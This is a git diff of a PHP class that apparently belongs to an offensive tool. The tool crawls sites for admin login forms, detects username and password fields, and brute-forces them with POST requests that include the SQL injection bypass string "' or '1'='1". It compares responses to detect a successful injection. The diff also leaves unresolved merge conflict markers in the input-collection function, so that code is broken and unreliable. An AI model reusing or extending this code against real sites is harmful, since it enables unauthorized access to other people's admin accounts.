@@ -48,8 +48,7 @@ class Site{
 				$existInputUsername = $this->checkInputUsername($body);
 			}
 
-
-			if($existInputPassword AND $existInputUsername){
+			if($existInputPassword AND $existInputUsername AND $existInputPassword['actionParentForm']==$existInputUsername['actionParentForm']){
 				return true;
 			}
 		}
@@ -95,13 +94,18 @@ class Site{
 
 	public function getActionForm()
 	{
+		$result="";
 		$crawler 	= new Crawler($this->bodyTarget);
-		$action = $crawler->filter('form')->attr("action");
-		$isUrl   	= v::url()->notEmpty()->validate($action);
-		if(!$isUrl){
-			$action=$this->sanitazeActionForm($action);
-		}
-		return $action;
+
+		$action = $crawler->filter('form')->each(function (Crawler $node, $i) use(&$result)
+		{
+			if($this->isAdmin($node->parents('form')->html()))
+			{
+				$result= $this->sanitazeActionForm($node->attr('action'));
+			}
+		});
+
+		return $result;
 	}
 
 	public function bruteForceAll($action,$method,$username,$password,$otherFields)
@@ -127,8 +131,14 @@ class Site{
 			if(strcasecmp($method,'post')==0){
 				try{
 					$body = $client->post($action,array(),$dataToPost)->getBody()->getContents();
-					echo $action;
-					var_dump($dataToPost);
+					//$headers = $client->post($action,array(),$dataToPost)->getHeader();
+					$headers1 = $client->post($action,array(),$dataToPost)->getHeaders();
+					if($dataToPost['email']=="' or '1'='1"){
+						//var_dump($headers);
+						var_dump($headers1);
+						var_dump($dataToPost);exit();
+					}
+
 				}catch(\Exception $e){
 					if($e->getCode()=="404"){
 						echo $e->getCode()." - page not Found;";
@@ -149,10 +159,10 @@ class Site{
 			}
 			if($keyInjetion==0)
 			{
+
 				$pageControl=$body;
-				var_dump($pageControl);
 			}
-			//var_dump($body);
+
 			if($pageControl!=$body )
 			{
 				var_dump($pageControl);
@@ -267,37 +277,44 @@ class Site{
 
 		$dataFields=array();
 
+		//$inputs2 = $crawler->filter('form')->selectButton('input[type=submit]')->form();
 		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$dataFields,&$excludes) {
+<<<<<<< HEAD
 
 			if(($node->attr('type')!='submit') AND (!$excludes OR ($key = array_key_exists($node->attr('name'), $excludes)) === false))
+=======
+			$keyResult=$node->parents()->filter('form')->attr('action');
+			if((!$excludes OR ($key = array_key_exists($node->attr('name'), $excludes)) === false))
+>>>>>>> 0981b4d1c3eb7cc461f9508f0174ba6c28abef67
 			{
-				$dataFields[$node->attr('name')]= $node->attr('value');
+				$dataFields[$this->sanitazeActionForm($keyResult)][$node->attr('name')]= $node->attr('value');
 			}
-
-
 
 		});
 
 		return $dataFields;
 	}
 
-	private function checkInputPassword()
+	private function checkInputPassword($body)
 	{
 		$checkPassword = false;
-		$crawler 	= new Crawler($this->bodyTarget);
+		$crawler 	= new Crawler($body);
 
 		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkPassword) {
 				if($node->attr('name'))
 				{
+					$actionForm=$node->parents()->filter('form')->attr('action');
 					$validPassword =  $this->verifyListNamesPassword($node->attr('name'));
 				}
 				if(!$node->attr('name') AND $node->attr('id'))
 				{
+					$actionForm=$node->parents()->filter('form')->attr('action');
 					$validPassword = $this->verifyListNamesPassword($node->attr('id'));
 				}
 				if(isset($validPassword) AND !empty($validPassword))
 				{
-					$checkPassword=$validPassword;
+					$checkPassword['name']=$validPassword;
+					$checkPassword['actionParentForm']=$actionForm;
 				}
 		});
 		return $checkPassword;
@@ -314,22 +331,25 @@ class Site{
 		return false;
 	}
 
-	private function checkInputUsername()
+	private function checkInputUsername($body)
 	{
 		$checkUsername=false;
-		$crawler 	= new Crawler($this->bodyTarget);
+		$crawler 	= new Crawler($body);
 		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkUsername) {
 			if($node->attr('name'))
 			{
+				$actionForm=$node->parents()->filter('form')->attr('action');
 				$validUsername =  $this->verifyListNamesUsername($node->attr('name'));
 			}
 			if(!$node->attr('name') AND $node->attr('id'))
 			{
+				$actionForm=$node->parents()->filter('form')->attr('action');
 				$validUsername = $this->verifyListNamesUsername($node->attr('id'));
 			}
 			if(isset($validUsername) AND !empty($validUsername))
 			{
-				$checkUsername=$validUsername;
+				$checkUsername['name']=$validUsername;
+				$checkUsername['actionParentForm']=$actionForm;
 			}
 		});
 		return $checkUsername;
